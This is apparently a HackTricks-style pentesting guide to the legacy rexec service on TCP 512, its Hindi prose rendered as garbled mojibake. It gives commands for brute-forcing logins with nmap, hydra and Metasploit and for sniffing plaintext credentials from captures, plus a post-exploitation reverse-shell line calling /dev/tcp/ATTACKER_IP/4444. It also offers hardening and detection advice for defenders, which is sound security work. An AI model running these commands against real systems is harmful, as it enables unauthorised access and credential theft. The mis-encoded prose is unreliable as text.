# 512 - Pentesting Rexec

{{#include ../banners/hacktricks-training.md}}

## Basic Information

Rexec (remote **exec**) рдореВрд▓ Berkeley *r*-services рд╕реВрдЯ рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИ (рдЬрд┐рд╕рдореЗрдВ `rlogin`, `rsh`, тАж рд╢рд╛рдорд┐рд▓ рд╣реИрдВ)ред рдпрд╣ **рдПрдХ рджреВрд░рд╕реНрде рдХрдорд╛рдВрдб-рдирд┐рд╖реНрдкрд╛рджрди** рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ **рдЬреЛ рдХреЗрд╡рд▓ рд╕реНрдкрд╖реНрдЯ-рдЯреЗрдХреНрд╕реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде рдкреНрд░рдорд╛рдгрд┐рдд рд╣реЛрддрд╛ рд╣реИ**ред рдЗрд╕ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ 1980 рдХреЗ рджрд╢рдХ рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ (рджреЗрдЦреЗрдВ RFC 1060) рдФрд░ рдЖрдЬ рдЗрд╕реЗ **рдбрд┐рдЬрд╛рдЗрди рджреНрд╡рд╛рд░рд╛ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд** рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред рдлрд┐рд░ рднреА, рдпрд╣ рдХреБрдЫ рд╡рд┐рд░рд╛рд╕рддреА UNIX / рдиреЗрдЯрд╡рд░реНрдХ-рд╕реЗ рдЬреБрдбрд╝реЗ рдЙрдкрдХрд░рдгреЛрдВ рдореЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕рдХреНрд╖рдо рд╣реИ рдФрд░ рдХрднреА-рдХрднреА рдЖрдВрддрд░рд┐рдХ pentests рдХреЗ рджреМрд░рд╛рди рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИред

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреЛрд░реНрдЯ:** TCP 512 (`exec`)
```
PORT    STATE SERVICE
512/tcp open  exec
```
> ЁЯФе  рд╕рднреА рдЯреНрд░реИрдлрд╝рд┐рдХ - рдЬрд┐рд╕рдореЗрдВ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ - **рдЕрд╕рдВрдХреНрд░рдорд┐рдд** рд░реВрдк рд╕реЗ рдкреНрд░реЗрд╖рд┐рдд рд╣реЛрддрд╛ рд╣реИред рдиреЗрдЯрд╡рд░реНрдХ рдХреЛ рд╕реНрдирд┐рдлрд╝ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд░рдЦрдиреЗ рд╡рд╛рд▓рд╛ рдХреЛрдИ рднреА рд╡реНрдпрдХреНрддрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо, рдкрд╛рд╕рд╡рд░реНрдб рдФрд░ рдХрдорд╛рдВрдб рдХреЛ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рддреНрд╡рд░рд┐рдд рдЕрд╡рд▓реЛрдХрди

1. рдХреНрд▓рд╛рдЗрдВрдЯ TCP 512 рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрддрд╛ рд╣реИред
2. рдХреНрд▓рд╛рдЗрдВрдЯ рддреАрди **NUL-terminated** рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рднреЗрдЬрддрд╛ рд╣реИ:
* рдкреЛрд░реНрдЯ рдирдВрдмрд░ (ASCII рдХреЗ рд░реВрдк рдореЗрдВ) рдЬрд╣рд╛рдВ рд╡рд╣ stdout/stderr рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИ (рдЕрдХреНрд╕рд░ `0`),
* **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо**,
* **рдкрд╛рд╕рд╡рд░реНрдб**ред
3. рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдВрддрд┐рдо NUL-terminated рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рд╕рд╛рде **рдХрдорд╛рдВрдб** рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред
4. рд╕рд░реНрд╡рд░ рдПрдХрд▓ 8-рдмрд┐рдЯ рд╕реНрдерд┐рддрд┐ рдмрд╛рдЗрдЯ (0 = рд╕рдлрд▓рддрд╛, `1` = рд╡рд┐рдлрд▓рддрд╛) рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рдХреЗ рдмрд╛рдж рдХрдорд╛рдВрдб рдЖрдЙрдЯрдкреБрдЯ рд╣реЛрддрд╛ рд╣реИред

рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк `echo -e` рдФрд░ `nc` рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдХреБрдЫ рднреА рдирд╣реАрдВ рд▓реЗрдХрд░ рдЖрджрд╛рди-рдкреНрд░рджрд╛рди рдХреЛ рдкреБрди: рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
(echo -ne "0\0user\0password\0id\0"; cat) | nc <target> 512
```
рдпрджрд┐ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдорд╛рдиреНрдп рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рдЙрд╕реА рдХрдиреЗрдХреНрд╢рди рдкрд░ рд╕реАрдзреЗ `id` рдХрд╛ рдЖрдЙрдЯрдкреБрдЯ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧрд╛ред

### рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд╕рд╛рде рдореИрдиреБрдЕрд▓ рдЙрдкрдпреЛрдЧ

рдХрдИ рд▓рд┐рдирдХреНрд╕ рд╡рд┐рддрд░рдг рдЕрднреА рднреА **inetutils-rexec** / **rsh-client** рдкреИрдХреЗрдЬ рдХреЗ рдЕрдВрджрд░ рдкреБрд░рд╛рдирд╛ рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ:
```bash
rexec -l user -p password <target> "uname -a"
```
рдпрджрд┐ `-p` рдХреЛ рдЫреЛрдбрд╝ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдХреНрд▓рд╛рдЗрдВрдЯ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд▓рд┐рдП рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ рд░реВрдк рд╕реЗ рд╕рдВрдХреЗрдд рджреЗрдЧрд╛ (рдЬреЛ рдХрд┐ рд╡рд╛рдпрд░ рдкрд░ рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛!)ред

---
## Enumeration & Brute-forcing

### [**Brute-force**](../generic-hacking/brute-force.md#rexec)

### Nmap
```bash
nmap -p 512 --script rexec-info <target>
# Discover service banner and test for stdout port mis-configuration

nmap -p 512 --script rexec-brute --script-args "userdb=users.txt,passdb=rockyou.txt" <target>
```
`rexec-brute` NSE рдЙрдкрд░реЛрдХреНрдд рд╡рд░реНрдгрд┐рдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрд╣реБрдд рддреЗрдЬреА рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИред

### Hydra / Medusa / Ncrack
```bash
hydra -L users.txt -P passwords.txt rexec://<target> -s 512 -t 8
```
`hydra` рдХрд╛ рдПрдХ рд╕рдорд░реНрдкрд┐рдд **rexec** рдореЙрдбреНрдпреВрд▓ рд╣реИ рдФрд░ рдпрд╣ рд╕рдмрд╕реЗ рддреЗрдЬрд╝ рдСрдлрд╝рд▓рд╛рдЗрди рдмреНрд░реВрдЯрдлреЛрд░реНрд╕рд░ рдмрдирд╛ рд░рд╣рддрд╛ рд╣реИред `medusa` (`-M REXEC`) рдФрд░ `ncrack` (`rexec` рдореЙрдбреНрдпреВрд▓) рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрд╕реА рддрд░рд╣ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### Metasploit
```
use auxiliary/scanner/rservices/rexec_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```
рдореЙрдбреНрдпреВрд▓ рд╕рдлрд▓ рд╣реЛрдиреЗ рдкрд░ рдПрдХ рд╢реЗрд▓ рдЙрддреНрдкрдиреНрди рдХрд░реЗрдЧрд╛ рдФрд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рд╕реНрдЯреЛрд░ рдХрд░реЗрдЧрд╛ред

---
## рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреА рд╕реНрдирд┐рдлрд┐рдВрдЧ

рдХреНрдпреЛрдВрдХрд┐ рд╕рдм рдХреБрдЫ рд╕реНрдкрд╖реНрдЯ-рдЯреЗрдХреНрд╕реНрдЯ рдореЗрдВ рд╣реИ, **рдиреЗрдЯрд╡рд░реНрдХ рдХреИрдкреНрдЪрд░ рдЕрдореВрд▓реНрдп рд╣реИрдВ**ред рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреА рдПрдХ рдкреНрд░рддрд┐ рдХреЗ рд╕рд╛рде рдЖрдк рд▓рдХреНрд╖реНрдп рдХреЛ рдЫреБрдП рдмрд┐рдирд╛ рдХреНрд░реЗрдбреНрд╕ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
tshark -r traffic.pcap -Y 'tcp.port == 512' -T fields -e data.decoded | \
awk -F"\\0" '{print $2":"$3" -> "$4}'  # username:password -> command
```
(In Wireshark рдореЗрдВ *Decode As тАжтАЛ* TCP 512 тЖТ REXEC рд╕рдХреНрд╖рдо рдХрд░реЗрдВ рддрд╛рдХрд┐ рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рдкрд╛рд░реНрд╕ рдХрд┐рдП рдЧрдП рдлрд╝реАрд▓реНрдб рджреЗрдЦ рд╕рдХреЗрдВред)

---
## Post-Exploitation tips

* рджрд┐рдП рдЧрдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдХрдорд╛рдВрдб рдЪрд▓рд╛рдП рдЬрд╛рддреЗ рд╣реИрдВред рдпрджрд┐ `/etc/pam.d/rexec` рдЧрд▓рдд рддрд░реАрдХреЗ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ (рдЬреИрд╕реЗ `pam_rootok`), рддреЛ рдХрднреА-рдХрднреА рд░реВрдЯ рд╢реЗрд▓ рд╕рдВрднрд╡ рд╣реЛрддреЗ рд╣реИрдВред
* Rexec рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╢реЗрд▓ рдХреА рдЕрдирджреЗрдЦреА рдХрд░рддрд╛ рд╣реИ рдФрд░ рдХрдорд╛рдВрдб рдХреЛ `/bin/sh -c <cmd>` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП рдЖрдк рдХрдИ рдХрдорд╛рдВрдб рдХреЛ рдЬреЛрдбрд╝рдиреЗ рдпрд╛ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рд╛рдорд╛рдиреНрдп рд╢реЗрд▓-рдПрд╕реНрдХреЗрдк рдЯреНрд░рд┐рдХреНрд╕ (`;`, ``$( )``, рдмреИрдХрдЯрд┐рдХ) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
rexec -l user -p pass <target> 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'
```
* рдкрд╛рд╕рд╡рд░реНрдб рдЕрдХреНрд╕рд░ рдЕрдиреНрдп рд╕рд┐рд╕реНрдЯрдо рдкрд░ **~/.netrc** рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВ; рдпрджрд┐ рдЖрдк рдПрдХ рд╣реЛрд╕реНрдЯ рд╕реЗ рд╕рдордЭреМрддрд╛ рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдЙрдиреНрд╣реЗрдВ рдкрд╛рд░реНрд╢реНрд╡ рдЖрдВрджреЛрд▓рди рдХреЗ рд▓рд┐рдП рдкреБрди: рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

---
## Hardening / Detection

* **rexec рдХреЛ рдЙрдЬрд╛рдЧрд░ рди рдХрд░реЗрдВ**; рдЗрд╕реЗ SSH рд╕реЗ рдмрджрд▓реЗрдВред рд▓рдЧрднрдЧ рд╕рднреА рдЖрдзреБрдирд┐рдХ *inetd* рд╕реБрдкрд░ рд╕рд░реНрд╡рд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕реЗрд╡рд╛ рдХреЛ рдЯрд┐рдкреНрдкрдгреА рдХрд░рддреЗ рд╣реИрдВред
* рдпрджрд┐ рдЖрдкрдХреЛ рдЗрд╕реЗ рдмрдирд╛рдП рд░рдЦрдирд╛ рд╣реИ, рддреЛ TCP wrappers (`/etc/hosts.allow`) рдпрд╛ рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдирд┐рдпрдореЛрдВ рдХреЗ рд╕рд╛рде рдкрд╣реБрдВрдЪ рдХреЛ рд╕реАрдорд┐рдд рдХрд░реЗрдВ рдФрд░ рдкреНрд░рддрд┐-рдЦрд╛рддрд╛ рдордЬрдмреВрдд рдкрд╛рд╕рд╡рд░реНрдб рд▓рд╛рдЧреВ рдХрд░реЗрдВред
* :512 рдкрд░ рдЯреНрд░реИрдлрд╝рд┐рдХ рдФрд░ `rexecd` рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд▓реЙрдиреНрдЪ рдХреЗ рд▓рд┐рдП рдирд┐рдЧрд░рд╛рдиреА рд░рдЦреЗрдВред рдПрдХрд▓ рдкреИрдХреЗрдЯ рдХреИрдкреНрдЪрд░ рд╕рдордЭреМрддреЗ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рд╣реИред
* `rexec`, `rlogin`, `rsh` рдХреЛ рдПрдХ рд╕рд╛рде рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░реЗрдВ - рд╡реЗ рдЕрдзрд┐рдХрд╛рдВрд╢ рд╕рдорд╛рди рдХреЛрдбрдмреЗрд╕ рдФрд░ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЛ рд╕рд╛рдЭрд╛ рдХрд░рддреЗ рд╣реИрдВред

---

## References

* Nmap NSE `rexec-brute` рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ тАУ [https://nmap.org/nsedoc/scripts/rexec-brute.html](https://nmap.org/nsedoc/scripts/rexec-brute.html)
* Rapid7 Metasploit рдореЙрдбреНрдпреВрд▓ `auxiliary/scanner/rservices/rexec_login` тАУ [https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rexec_login](https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rexec_login)
{{#include ../banners/hacktricks-training.md}}
